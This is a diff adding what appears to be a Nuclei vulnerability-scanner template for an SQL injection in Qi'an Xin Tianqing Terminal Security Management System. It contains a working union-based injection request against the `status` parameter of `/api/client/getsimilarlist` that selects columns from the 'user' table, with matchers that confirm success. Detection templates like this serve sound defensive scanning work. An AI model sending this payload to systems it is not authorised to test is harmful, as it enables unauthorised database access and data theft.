@@ -1,0 +1,36 @@
+id: tianqing-sql-injection
+info:
+  name: Tianqing Terminal Security Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Qi'an Xin Tianqing Terminal Security Management System has an SQL injection vulnerability in the `status` parameter of the `/api/client/getsimilarlist` route. Attackers can exploit this to obtain sensitive database information.
+  classification:
+    cvss-score: 8.2
+  metadata:
+    product: Qianxin-TianQing
+    tags: sql-injection, database
+http:
+  - raw:
+      - |
+        GET /api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+{{rand_int(10000000,99999999)}}%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    extractors:
+      - type: regex
+        name: sql_injection_check
+        internal: true
+        group: 1
+        regex:
+          - \d{8}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{sql_injection_check}}'
+          - 'setting'
+      - type: status
+        status:
+          - 200
